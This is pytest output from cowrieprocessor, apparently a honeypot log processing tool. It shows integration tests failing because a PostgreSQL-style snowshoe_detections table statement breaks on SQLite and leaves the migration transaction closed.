2025-10-18 17:42:29,196:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 17:42:29,199:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 17:42:29,199:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 17:42:29,200:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 17:42:29,200:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 17:42:29,201:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 17:42:29,201:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 17:42:29,202:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 17:42:29,202:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 17:42:29,205:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 17:42:29,205:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 17:42:29,206:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 17:42:29,206:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 17:42:29,207:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:42:29,207:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:42:29,208:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:42:29,208:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:42:29,209:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:42:29,209:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:42:29,211:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:42:29,211:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:42:29,212:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:42:29,212:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:42:29,213:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:42:29,213:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:42:29,213:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
2025-10-18 17:42:29,213:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
------------------------------ Captured log setup ------------------------------
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Set default source_generation values
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Create unique index on raw_events
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate session_id from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_type from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_timestamp from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for files.vt_malicious will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:418 Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
INFO     cowrieprocessor.db.migrations:migrations.py:683 Starting snowshoe detection schema migration (v8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
INFO     cowrieprocessor.db.migrations:migrations.py:725 Snowshoe detection schema migration (v8) completed successfully
=================================== FAILURES ===================================
______________ TestCowrieDatabaseCLI.test_cowrie_database_sqlite _______________

self = <cowrieprocessor.cli.cowrie_db.CowrieDatabase object at 0x7756b336d2b0>
target_version = None, dry_run = False

    def migrate(self, target_version: Optional[int] = None, dry_run: bool = False) -> Dict[str, Any]:
        """Run database schema migrations.
    
        Args:
            target_version: Target schema version (None for latest)
            dry_run: Show what would be done without executing
    
        Returns:
            Migration result with details
        """
        # Check if database file exists
        if self._is_sqlite():
            db_path = self.db_url.replace("sqlite:///", "")
            db_exists = Path(db_path).exists()
        else:
            # For PostgreSQL, assume database exists if we can connect
            db_exists = True
    
        if not db_exists:
            current_version = 0
        else:
            current_version = self.get_schema_version()
    
        target = target_version or CURRENT_SCHEMA_VERSION
    
        result = {
            'current_version': current_version,
            'target_version': target,
            'migrations_applied': [],
            'dry_run': dry_run,
        }
    
        if current_version >= target:
            result['message'] = f"Database already at version {current_version}"
            return result
    
        if dry_run:
            result['migrations_applied'] = [f"Migration to version {v}" for v in range(current_version + 1, target + 1)]
            result['message'] = f"Would migrate from v{current_version} to v{target}"
            return result
    
        try:
            # Apply migrations directly - this handles creating tables if they don't exist
>           final_version = apply_migrations(self._get_engine())

/home/speterson/cowrieprocessor/cowrieprocessor/cli/cowrie_db.py:192: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:182: in apply_migrations
    _set_schema_version(connection, 8)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:132: in _set_schema_version
    result = connection.execute(stmt)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1836: in _execute_context
    TransactionalContext._trans_ctx_check(self)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

cls = <class 'sqlalchemy.engine.util.TransactionalContext'>
subject = <sqlalchemy.engine.base.Connection object at 0x7756b3306d50>

    @classmethod
    def _trans_ctx_check(cls, subject: _TConsSubject) -> None:
        trans_context = subject._trans_context_manager
        if trans_context:
            if not trans_context._transaction_is_active():
>               raise exc.InvalidRequestError(
                    "Can't operate on closed transaction inside context "
                    "manager.  Please complete the context manager "
                    "before emitting further commands."
                )
E               sqlalchemy.exc.InvalidRequestError: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/util.py:111: InvalidRequestError

The above exception was the direct cause of the following exception:

self = <test_cli_tools.TestCowrieDatabaseCLI object at 0x7756b4679f90>

    def test_cowrie_database_sqlite(self) -> None:
        """Test CowrieDatabase with SQLite database."""
        with tempfile.NamedTemporaryFile(suffix=".sqlite", delete=False) as tmp_file:
            db_path = tmp_file.name
    
        try:
            db_url = f"sqlite:///{db_path}"
            db = CowrieDatabase(db_url)
    
            # Test database type detection
            assert db._is_sqlite() is True
            assert db._is_postgresql() is False
    
            # Test migration
>           result = db.migrate()

/home/speterson/cowrieprocessor/tests/integration/test_cli_tools.py:37: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

self = <cowrieprocessor.cli.cowrie_db.CowrieDatabase object at 0x7756b336d2b0>
target_version = None, dry_run = False

    def migrate(self, target_version: Optional[int] = None, dry_run: bool = False) -> Dict[str, Any]:
        """Run database schema migrations.
    
        Args:
            target_version: Target schema version (None for latest)
            dry_run: Show what would be done without executing
    
        Returns:
            Migration result with details
        """
        # Check if database file exists
        if self._is_sqlite():
            db_path = self.db_url.replace("sqlite:///", "")
            db_exists = Path(db_path).exists()
        else:
            # For PostgreSQL, assume database exists if we can connect
            db_exists = True
    
        if not db_exists:
            current_version = 0
        else:
            current_version = self.get_schema_version()
    
        target = target_version or CURRENT_SCHEMA_VERSION
    
        result = {
            'current_version': current_version,
            'target_version': target,
            'migrations_applied': [],
            'dry_run': dry_run,
        }
    
        if current_version >= target:
            result['message'] = f"Database already at version {current_version}"
            return result
    
        if dry_run:
            result['migrations_applied'] = [f"Migration to version {v}" for v in range(current_version + 1, target + 1)]
            result['message'] = f"Would migrate from v{current_version} to v{target}"
            return result
    
        try:
            # Apply migrations directly - this handles creating tables if they don't exist
            final_version = apply_migrations(self._get_engine())
            result['final_version'] = final_version
            result['migrations_applied'] = [
                f"Applied migration to version {v}" for v in range(current_version + 1, final_version + 1)
            ]
            result['message'] = f"Successfully migrated to version {final_version}"
    
        except Exception as e:
            result['error'] = str(e)
            result['message'] = f"Migration failed: {e}"
>           raise Exception(f"Migration failed: {e}") from e
E           Exception: Migration failed: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/cowrieprocessor/cli/cowrie_db.py:202: Exception
----------------------------- Captured stdout call -----------------------------
2025-10-18 17:39:13,391:WARNING:cowrieprocessor.cli.cowrie_db:cowrie_db.py:get_schema_version:Could not get schema version: (sqlite3.OperationalError) no such table: schema_state
[SQL: SELECT value FROM schema_state WHERE key = 'schema_version']
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:39:13,591:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 17:39:13,592:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 17:39:13,600:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 17:39:13,603:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 17:39:13,605:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 17:39:13,607:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 17:39:13,610:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 17:39:13,611:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 17:39:13,613:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 17:39:13,614:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 17:39:13,615:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 17:39:13,616:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 17:39:13,620:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 17:39:13,621:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:39:13,622:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:39:13,622:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:39:13,623:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:39:13,623:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:39:13,626:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:39:13,626:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
------------------------------ Captured log call -------------------------------
WARNING  cowrieprocessor.cli.cowrie_db:cowrie_db.py:146 Could not get schema version: (sqlite3.OperationalError) no such table: schema_state
[SQL: SELECT value FROM schema_state WHERE key = 'schema_version']
(Background on this error at: https://sqlalche.me/e/20/e3q8)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Set default source_generation values
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Create unique index on raw_events
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate session_id from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_type from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_timestamp from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for files.vt_malicious will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:418 Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
INFO     cowrieprocessor.db.migrations:migrations.py:683 Starting snowshoe detection schema migration (v8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
INFO     cowrieprocessor.db.migrations:migrations.py:725 Snowshoe detection schema migration (v8) completed successfully
________ TestCowrieDatabaseCLI.test_cowrie_database_optimization_sqlite ________

self = <cowrieprocessor.cli.cowrie_db.CowrieDatabase object at 0x7756b2ff3890>
target_version = None, dry_run = False

    def migrate(self, target_version: Optional[int] = None, dry_run: bool = False) -> Dict[str, Any]:
        """Run database schema migrations.
    
        Args:
            target_version: Target schema version (None for latest)
            dry_run: Show what would be done without executing
    
        Returns:
            Migration result with details
        """
        # Check if database file exists
        if self._is_sqlite():
            db_path = self.db_url.replace("sqlite:///", "")
            db_exists = Path(db_path).exists()
        else:
            # For PostgreSQL, assume database exists if we can connect
            db_exists = True
    
        if not db_exists:
            current_version = 0
        else:
            current_version = self.get_schema_version()
    
        target = target_version or CURRENT_SCHEMA_VERSION
    
        result = {
            'current_version': current_version,
            'target_version': target,
            'migrations_applied': [],
            'dry_run': dry_run,
        }
    
        if current_version >= target:
            result['message'] = f"Database already at version {current_version}"
            return result
    
        if dry_run:
            result['migrations_applied'] = [f"Migration to version {v}" for v in range(current_version + 1, target + 1)]
            result['message'] = f"Would migrate from v{current_version} to v{target}"
            return result
    
        try:
            # Apply migrations directly - this handles creating tables if they don't exist
>           final_version = apply_migrations(self._get_engine())

/home/speterson/cowrieprocessor/cowrieprocessor/cli/cowrie_db.py:192: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:182: in apply_migrations
    _set_schema_version(connection, 8)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:132: in _set_schema_version
    result = connection.execute(stmt)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1836: in _execute_context
    TransactionalContext._trans_ctx_check(self)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

cls = <class 'sqlalchemy.engine.util.TransactionalContext'>
subject = <sqlalchemy.engine.base.Connection object at 0x7756b309e8d0>

    @classmethod
    def _trans_ctx_check(cls, subject: _TConsSubject) -> None:
        trans_context = subject._trans_context_manager
        if trans_context:
            if not trans_context._transaction_is_active():
>               raise exc.InvalidRequestError(
                    "Can't operate on closed transaction inside context "
                    "manager.  Please complete the context manager "
                    "before emitting further commands."
                )
E               sqlalchemy.exc.InvalidRequestError: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/util.py:111: InvalidRequestError

The above exception was the direct cause of the following exception:

self = <test_cli_tools.TestCowrieDatabaseCLI object at 0x7756b467a0d0>

    def test_cowrie_database_optimization_sqlite(self) -> None:
        """Test database optimization with SQLite."""
        with tempfile.NamedTemporaryFile(suffix=".sqlite", delete=False) as tmp_file:
            db_path = tmp_file.name
    
        try:
            db_url = f"sqlite:///{db_path}"
            db = CowrieDatabase(db_url)
    
            # Apply migrations first
>           db.migrate()

/home/speterson/cowrieprocessor/tests/integration/test_cli_tools.py:72: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

self = <cowrieprocessor.cli.cowrie_db.CowrieDatabase object at 0x7756b2ff3890>
target_version = None, dry_run = False

    def migrate(self, target_version: Optional[int] = None, dry_run: bool = False) -> Dict[str, Any]:
        """Run database schema migrations.
    
        Args:
            target_version: Target schema version (None for latest)
            dry_run: Show what would be done without executing
    
        Returns:
            Migration result with details
        """
        # Check if database file exists
        if self._is_sqlite():
            db_path = self.db_url.replace("sqlite:///", "")
            db_exists = Path(db_path).exists()
        else:
            # For PostgreSQL, assume database exists if we can connect
            db_exists = True
    
        if not db_exists:
            current_version = 0
        else:
            current_version = self.get_schema_version()
    
        target = target_version or CURRENT_SCHEMA_VERSION
    
        result = {
            'current_version': current_version,
            'target_version': target,
            'migrations_applied': [],
            'dry_run': dry_run,
        }
    
        if current_version >= target:
            result['message'] = f"Database already at version {current_version}"
            return result
    
        if dry_run:
            result['migrations_applied'] = [f"Migration to version {v}" for v in range(current_version + 1, target + 1)]
            result['message'] = f"Would migrate from v{current_version} to v{target}"
            return result
    
        try:
            # Apply migrations directly - this handles creating tables if they don't exist
            final_version = apply_migrations(self._get_engine())
            result['final_version'] = final_version
            result['migrations_applied'] = [
                f"Applied migration to version {v}" for v in range(current_version + 1, final_version + 1)
            ]
            result['message'] = f"Successfully migrated to version {final_version}"
    
        except Exception as e:
            result['error'] = str(e)
            result['message'] = f"Migration failed: {e}"
>           raise Exception(f"Migration failed: {e}") from e
E           Exception: Migration failed: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/cowrieprocessor/cli/cowrie_db.py:202: Exception
----------------------------- Captured stdout call -----------------------------
2025-10-18 17:39:14,522:WARNING:cowrieprocessor.cli.cowrie_db:cowrie_db.py:get_schema_version:Could not get schema version: (sqlite3.OperationalError) no such table: schema_state
[SQL: SELECT value FROM schema_state WHERE key = 'schema_version']
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 17:39:14,598:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
